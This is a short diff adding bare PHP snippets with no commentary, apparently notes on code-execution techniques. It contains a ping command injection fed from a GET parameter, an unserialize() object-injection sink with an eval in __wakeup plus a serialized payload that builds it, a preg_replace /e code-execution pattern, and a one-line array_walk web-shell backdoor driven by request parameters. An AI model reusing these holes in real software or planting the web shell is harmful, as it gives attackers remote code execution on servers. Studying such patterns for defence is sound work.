@@ -1,0 +1,31 @@
+<?php 
+$host=$_GET['host'];
+system("ping ".$host." -i 10")
+
+
+<?php 
+class Example{
+   private $hook;
+   function __wakeup(){
+      if (isset($this->hook)) eval($this->hook);
+   }
+}
+$user_data = unserialize($_GET['data']);
+
+
+class Example{private $hook = "phpinfo();";}
+urlencode(serialize(new Example));
+
+============
+<?php 
+function dosome($str) {
+    echo $str; 
+    //pass ... 
+}
+$attr = $_GET["attr"];
+ 
+preg_replace("/aa-(.*?)-bb/ies", 'dosome("\1")', $attr); 
+=====
+$arr=array($_POST['pass'] => '|.*|e',);array_walk($arr,$_REQUEST['e'],'');
+===
+
